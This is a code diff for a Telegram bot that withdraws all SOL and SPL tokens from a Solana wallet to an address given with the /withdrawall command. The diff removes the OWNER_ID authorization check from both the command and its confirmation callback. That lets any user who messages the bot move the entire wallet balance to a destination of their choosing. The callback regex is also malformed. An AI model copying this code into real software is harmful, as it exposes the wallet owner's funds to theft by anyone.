@@ -1,64 +1,73 @@
-# utils/wallet_ops.py
-
+import os
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import CallbackContext
-
+from telegram.ext import CallbackContext, CommandHandler, CallbackQueryHandler
+from solana.publickey import PublicKey
 from utils.wallet import get_wallet_address, get_wallet_balance, transfer_all_tokens_and_sol
-from config import OWNER_ID
 
+# In-memory state for pending withdrawals
+WITHDRAW_ALL_STATE = {}
 
+# === /withdrawall Handler ===
 def withdrawall(update: Update, context: CallbackContext):
-    user_id = update.effective_user.id
-    if user_id != OWNER_ID:
-        update.message.reply_text("⛔ This command is restricted.")
-        return
-
     if not context.args:
-        update.message.reply_text("❗ Usage: /withdrawall <recipient_wallet_address>")
+        update.message.reply_text("❌ Usage: /withdrawall <destination_wallet_address>")
         return
 
-    recipient = context.args[0]
+    dest = context.args[0]
+    if not dest or len(dest) < 32:
+        update.message.reply_text("❌ Invalid wallet address.")
+        return
 
-    keyboard = [
+    chat_id = update.effective_chat.id
+    WITHDRAW_ALL_STATE[chat_id] = dest
+
+    buttons = [
         [
-            InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_all_withdraw:{recipient}"),
+            InlineKeyboardButton("✅ Confirm", callback_data="confirm_all_withdraw"),
             InlineKeyboardButton("❌ Cancel", callback_data="cancel_all_withdraw")
         ]
     ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
 
     update.message.reply_text(
-        f"⚠️ Are you sure you want to withdraw all SOL and SPL tokens to:\n\n<code>{recipient}</code>\n\nConfirm?",
+        f"Are you sure you want to withdraw all SOL and SPL tokens to:\n<code>{dest}</code>?",
         parse_mode="HTML",
-        reply_markup=reply_markup
+        reply_markup=InlineKeyboardMarkup(buttons)
     )
 
-
+# === Callback for Confirmation ===
 def handle_withdrawall_confirmation(update: Update, context: CallbackContext):
     query = update.callback_query
-    user_id = update.effective_user.id
     query.answer()
+    chat_id = query.message.chat_id
+    action = query.data
 
-    if user_id != OWNER_ID:
-        query.edit_message_text("⛔ Action not permitted.")
+    if action == "cancel_all_withdraw":
+        query.edit_message_text("❌ Withdraw cancelled.")
         return
 
-    if query.data.startswith("confirm_all_withdraw:"):
-        recipient = query.data.split(":")[1]
+    if action == "confirm_all_withdraw":
+        dest = WITHDRAW_ALL_STATE.get(chat_id)
+        if not dest:
+            query.edit_message_text("❌ No destination found.")
+            return
 
         try:
-            query.edit_message_text("⏳ Processing withdrawal...")
+            user_pubkey = get_wallet_address()
+            tx_links = transfer_all_tokens_and_sol(user_pubkey, dest)
 
-            result = transfer_all_tokens_and_sol(recipient)
+            if not tx_links:
+                query.edit_message_text("⚠️ No tokens to transfer or all failed.")
+                return
 
-            query.edit_message_text(
-                f"✅ Withdrawal Complete.\n\n<code>{result}</code>",
-                parse_mode="HTML"
-            )
+            msg = "✅ Withdraw complete:\n"
+            for symbol, link in tx_links.items():
+                msg += f"• {symbol}: <a href='{link}'>View Tx</a>\n"
+
+            query.edit_message_text(msg, parse_mode="HTML")
+
         except Exception as e:
-            query.edit_message_text(
-                f"❌ Withdrawal Failed:\n<code>{e}</code>",
-                parse_mode="HTML"
-            )
-    elif query.data == "cancel_all_withdraw":
-        query.edit_message_text("❌ Withdrawal Cancelled.")
+            query.edit_message_text(f"❌ Error: {e}")
+
+# === Handlers ===
+withdraw_all_handler = CommandHandler("withdrawall", withdrawall)
+confirm_all_handler = CallbackQueryHandler(handle_withdrawall_confirmation, pattern="^confirm_all_withdraw|cancel_all_withdraw$")
